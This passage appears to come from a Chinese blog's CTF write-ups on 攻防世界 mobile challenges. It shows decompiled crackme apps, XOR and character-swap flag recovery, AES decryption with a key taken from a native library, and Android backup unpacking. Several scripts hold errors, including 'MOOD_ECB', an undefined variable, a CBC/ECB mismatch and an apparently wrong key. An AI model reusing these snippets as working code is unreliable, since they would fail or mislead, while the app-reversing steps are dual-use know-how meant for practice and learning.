<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">list</span>(<span class="string">&#x27;f72c5a36569418a20907b55be5bf95ad&#x27;</span>) <span class="comment">#经过变化后的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">2</span>):</span><br><span class="line">    str1 = data[i+<span class="number">1</span>]</span><br><span class="line">    data[i+<span class="number">1</span>] = data[i]</span><br><span class="line">    data[i] = str1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;第一个循环题后的字符串：&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//<span class="number">2</span>):</span><br><span class="line">    str2 = data[i]</span><br><span class="line">    data[i] = data[i+<span class="number">16</span>]</span><br><span class="line">    data[i+<span class="number">16</span>] = str2</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;第二个循环后的字符串: &#x27;</span>+flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/image-20231024172425069.png" class title="image-20231024172425069">

<p>java脚本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">easygo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String string = <span class="string">&quot;f72c5a36569418a20907b55be5bf95ad&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span>[] data = string.toCharArray();</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="comment">//第二个循环进行变换</span></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = data.length;;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">char</span> str = data[i];</span><br><span class="line">            data [i] = data[i+<span class="number">1</span>];</span><br><span class="line">            data[i+<span class="number">1</span>] = str;</span><br><span class="line">            i=i+<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">while</span>(i&lt;n);</span><br><span class="line">        String str = <span class="keyword">new</span> String(data);</span><br><span class="line">        System.out.println(<span class="string">&quot;第二次循环体运行后的结果: &quot;</span>+str );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一个循环体</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> temp = data[i];</span><br><span class="line">            data[i] = data[i+<span class="number">16</span>];</span><br><span class="line">            data[i+<span class="number">16</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;第二次循环体运行后的结果: &quot;</span>+String.valueOf(data) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        easygo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/image-20231024184208397.png" class title="image-20231024184208397">

<p>得到flag{90705bb55efb59da7fc2a5636549812a}</p>
<p>使用解得的字符串登录，验证成功</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/image-20231024172930086.png" class title="image-20231024172930086">]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之app1</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp1/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之app1"><a href="#【攻防世界】Mobile系列之app1" class="headerlink" title="【攻防世界】Mobile系列之app1"></a>【攻防世界】Mobile系列之app1</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp1/image-20231025170855654.png" class title="image-20231025170855654">

<p>使用jadx反汇编该app,查看MainActivity类，逻辑判断代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button btn;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String pName = BuildConfig.APPLICATION_ID;</span><br><span class="line">    EditText text;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v4.app.BaseFragmentActivityGingerbread, android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.btn = (Button) findViewById(R.id.checBtn);</span><br><span class="line">        <span class="keyword">this</span>.text = (EditText) findViewById(R.id.input);</span><br><span class="line">        <span class="keyword">this</span>.btn.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.yaphetshan.tencentgreat.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String inputString = MainActivity.<span class="keyword">this</span>.text.getText().toString();</span><br><span class="line">                    PackageInfo pinfo = MainActivity.<span class="keyword">this</span>.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, <span class="number">16384</span>);</span><br><span class="line">                    String versionCode = pinfo.versionName;</span><br><span class="line">                    <span class="keyword">int</span> versionName = pinfo.versionCode;</span><br><span class="line">                    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) &#123;</span><br><span class="line">                            Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;再接再厉，加油~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (inputString.length() == versionCode.length()) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;恭喜开启闯关之门！&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;年轻人不要耍小聪明噢&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中只要使得输入的字符串长度和versionCode.length()相等时，即弹窗成功。根据代码分析可推出versionCode字段对应的字符串保存在BuildConfig中</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp1/image-20231025172604634.png" class title="image-20231025172604634">

<p>可以得出versionCode字符串为**”X&lt;cP[?PHNB&lt;P?aj”**，versionName为15</p>
<p>我们这里需要对字符串进行变化处理，可以看到代码中的一行判断语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName))</span><br></pre></td></tr></table></figure>

<p>这是对字符串和15进行了异或处理</p>
<h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">versioncode = <span class="number">15</span></span><br><span class="line">versionName = <span class="string">&#x27;X&lt;cP[?PHNB&lt;P?aj&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> versionName:</span><br><span class="line">    result +=<span class="built_in">chr</span>( <span class="built_in">ord</span>(i) ^ versioncode)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>得出结果为<strong>W3l_T0_GAM3_0ne</strong></p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp1/image-20231025175043452.png" class title="image-20231025175043452">]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之基础app2</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp2/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之app2"><a href="#【攻防世界】Mobile系列之app2" class="headerlink" title="【攻防世界】Mobile系列之app2"></a>【攻防世界】Mobile系列之app2</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp2/image-20231025180841017.png" class title="image-20231025180841017">

<p>点击登录后，显示”Waiting fot you!”</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp2/image-20231025180912683.png" class title="image-20231025180912683">

<p>反编译打开该app，定位程序入口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&#123;&quot;ShowToast&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button a;</span><br><span class="line">    <span class="keyword">private</span> Handler b = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> EditText c;</span><br><span class="line">    <span class="keyword">private</span> EditText d;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.a = (Button) findViewById(R.id.button1);</span><br><span class="line">        <span class="keyword">this</span>.a.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.c = (EditText) findViewById(R.id.editText1);</span><br><span class="line">        <span class="keyword">this</span>.d = (EditText) findViewById(R.id.editText2);</span><br><span class="line">        SharedPreferences.Editor edit = getSharedPreferences(<span class="string">&quot;test&quot;</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putLong(<span class="string">&quot;ili&quot;</span>, System.currentTimeMillis());</span><br><span class="line">        edit.commit();</span><br><span class="line">        Log.d(<span class="string">&quot;hashcode&quot;</span>, SignatureTool.getSignature(<span class="keyword">this</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem menuItem)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (menuItem.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(menuItem);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (view.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button1 <span class="comment">/*&#123;ENCODED_INT: 2131165187&#125;*/</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.c.getText().length() == <span class="number">0</span> || <span class="keyword">this</span>.d.getText().length() == <span class="number">0</span>) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;不能为空&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String obj = <span class="keyword">this</span>.c.getText().toString();</span><br><span class="line">                String obj2 = <span class="keyword">this</span>.d.getText().toString();</span><br><span class="line">                Log.e(<span class="string">&quot;test&quot;</span>, obj + <span class="string">&quot; test2 = &quot;</span> + obj2);</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;ili&quot;</span>, obj);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;lil&quot;</span>, obj2);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里**Intent intent &#x3D; new Intent(this, SecondActivity.class);**调用了SecondActivity类，我们继续跟踪</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondActivity</span> <span class="keyword">extends</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BroadcastReceiver c = <span class="keyword">new</span> BroadcastReceiver() &#123;</span><br><span class="line">        <span class="comment">/* class com.tencent.testvuln.SecondActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;myReceiver receive&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">if</span> (context.getPackageName().equals(intent.getAction())) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// com.tencent.testvuln.a</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main2);</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String stringExtra = intent.getStringExtra(<span class="string">&quot;ili&quot;</span>);</span><br><span class="line">        String stringExtra2 = intent.getStringExtra(<span class="string">&quot;lil&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Encryto.doRawData(<span class="keyword">this</span>, stringExtra + stringExtra2).equals(<span class="string">&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;</span>)) &#123;</span><br><span class="line">            intent.setAction(<span class="string">&quot;android.test.action.MoniterInstallService&quot;</span>);</span><br><span class="line">            intent.setClass(<span class="keyword">this</span>, MoniterInstallService.class);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;company&quot;</span>, <span class="string">&quot;tencent&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;age&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">            startService(intent);</span><br><span class="line">        &#125;</span><br><span class="line">        SharedPreferences.Editor edit = getSharedPreferences(<span class="string">&quot;test&quot;</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putString(<span class="string">&quot;ilil&quot;</span>, stringExtra);</span><br><span class="line">        edit.putString(<span class="string">&quot;lili&quot;</span>, stringExtra2);</span><br><span class="line">        edit.commit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem menuItem)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (menuItem.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(menuItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意到这行代码**Encryto.doRawData(this, stringExtra + stringExtra2).equals(“VEIzd&#x2F;V2UPYNdn&#x2F;bxH3Xig&#x3D;&#x3D;”)**将输入的两个字符串拼接然后使用Encryto.doRawData()对其进行处理后与”VEIzd&#x2F;V2UPYNdn&#x2F;bxH3Xig&#x3D;&#x3D;”作对比</p>
<p>我们继续跟踪Encryto.doRawData()，这是一个native层的so文件，我们使用IDA打开该文件定位到doRawData函数</p>
<p>伪代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl doRawData(int a1, int a2, int a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  char *v4; // esi</span><br><span class="line">  int result; // eax</span><br><span class="line">  char *v6; // esi</span><br><span class="line">  size_t v7; // eax</span><br><span class="line">  int v8; // [esp+0h] [ebp-2Ch]</span><br><span class="line">  int (__cdecl *v9)(int, char *, size_t); // [esp+0h] [ebp-2Ch]</span><br><span class="line">  char v10[20]; // [esp+4h] [ebp-28h] BYREF</span><br><span class="line">  unsigned int v11; // [esp+18h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(0x14u);</span><br><span class="line">  if ( checkSignature(a1, a2, a3) == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    strcpy(v10, &quot;thisisatestkey==&quot;);</span><br><span class="line">    v4 = (char *)(*(int (__cdecl **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a4, 0);</span><br><span class="line">    v8 = AES_128_ECB_PKCS5Padding_Encrypt(v4, (int)v10);</span><br><span class="line">    (*(void (__cdecl **)(int, int, char *))(*(_DWORD *)a1 + 680))(a1, a4, v4);</span><br><span class="line">    result = (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 668))(a1, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = UNSIGNATURE[0];</span><br><span class="line">    v9 = *(int (__cdecl **)(int, char *, size_t))(*(_DWORD *)a1 + 652);</span><br><span class="line">    v7 = strlen(UNSIGNATURE[0]);</span><br><span class="line">    result = v9(a1, v6, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面那一段程序是一个AES加密算法，使用CBC模式，密钥为”thisisatestkey&#x3D;&#x3D;”，如果想要获取明文的账号和密码，只需要对其进行AES解密操作获取明文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;thisisatestkey==&#x27;</span></span><br><span class="line">aes = AES.new(key,AES.MOOD_ECB)</span><br><span class="line">text = base64.b64decode(<span class="string">&#x27;VEIzd/V2UPYNdn/bxH3Xig==&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(test))</span><br></pre></td></tr></table></figure>

<p>得出如下结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aimage/tencent</span><br></pre></td></tr></table></figure>



<p>再次对反编译后的代码进行分析，在FileDataActivity中发现新的字符串</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp2/image-20231025194401220.png" class title="image-20231025194401220">

<p>然后对字符串”9YuQ2dk8CSaCe7DTAmaqAA&#x3D;&#x3D;”进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">key = &#x27;9YuQ2dk8CSaCe7DTAmaqAA==&#x27;</span><br><span class="line">aes = AES.new(key,AES.MOOD_ECB)</span><br><span class="line">text = base64.b64decode(&#x27;VEIzd/V2UPYNdn/bxH3Xig==&#x27;)</span><br><span class="line">print(aes.decrypt(test))</span><br></pre></td></tr></table></figure>

<p>得到Cas3_0f_A_CAK3</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之app3</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之app3"><a href="#【攻防世界】Mobile系列之app3" class="headerlink" title="【攻防世界】Mobile系列之app3"></a>【攻防世界】Mobile系列之app3</h1><p>这里下载的文件为ab文件，是由亚行创建的Android备份文件，需要对其进行转换处理成tar文件，这里需要下载一个abe-all.jar包才能进行解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar abe-all.jar unpack app3.ab app3 tar</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/image-20231026174835635.png" class title="image-20231026174835635">

<p>将上面的tar文件解压后得到一些db文件和apk安装包，运行该安装包</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/image-20231026180111638.png" class title="image-20231026180111638">

<p>点击登录按钮后会显示字符串并进入空白页面</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/image-20231026180148827.png" class title="image-20231026180148827">

<p>使用jadx反编译该app，定位MainActivity类查看代码逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase a;</span><br><span class="line">    <span class="keyword">private</span> a b;</span><br><span class="line">    <span class="keyword">private</span> Button c;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v4.app.BaseFragmentActivityGingerbread, android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.c = (Button) findViewById(R.id.add_data);</span><br><span class="line">        <span class="keyword">this</span>.c.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        SharedPreferences.Editor edit = getSharedPreferences(<span class="string">&quot;test&quot;</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putString(<span class="string">&quot;Is_Encroty&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        edit.putString(<span class="string">&quot;Encryto&quot;</span>, <span class="string">&quot;SqlCipher&quot;</span>);</span><br><span class="line">        edit.putString(<span class="string">&quot;ver_sion&quot;</span>, <span class="string">&quot;3_4_0&quot;</span>);</span><br><span class="line">        <span class="comment">//这里使用SqlCipher3_4_0对数据库文件进行加密</span></span><br><span class="line">        edit.apply();</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase.loadLibs(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.b = <span class="keyword">new</span> a(<span class="keyword">this</span>, <span class="string">&quot;Demo.db&quot;</span>, <span class="keyword">null</span>, <span class="number">1</span>);<span class="comment">//创建Demo.db的数据库文件</span></span><br><span class="line">        ContentValues contentValues = <span class="keyword">new</span> ContentValues();    <span class="comment">//ContentValues存储文本类对象</span></span><br><span class="line">        contentValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Stranger&quot;</span>);</span><br><span class="line">        contentValues.put(<span class="string">&quot;password&quot;</span>, (Integer) <span class="number">123456</span>);</span><br><span class="line">        <span class="comment">//将&quot;name&quot;和&quot;password&quot;字段数据插入数据库中</span></span><br><span class="line">        a aVar = <span class="keyword">new</span> a();</span><br><span class="line">        String a2 = aVar.a(contentValues.getAsString(<span class="string">&quot;name&quot;</span>), contentValues.getAsString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.a = <span class="keyword">this</span>.b.getWritableDatabase(aVar.a(a2 + aVar.b(a2, contentValues.getAsString(<span class="string">&quot;password&quot;</span>))).substring(<span class="number">0</span>, <span class="number">7</span>));<span class="comment">//ae56f99作为数据库密码</span></span><br><span class="line">        <span class="keyword">this</span>.a.insert(<span class="string">&quot;TencentMicrMsg&quot;</span>, <span class="keyword">null</span>, contentValues); <span class="comment">//插入TencentMicrMsg数据表中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (view == <span class="keyword">this</span>.c) &#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.putExtra(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;password&quot;</span>, <span 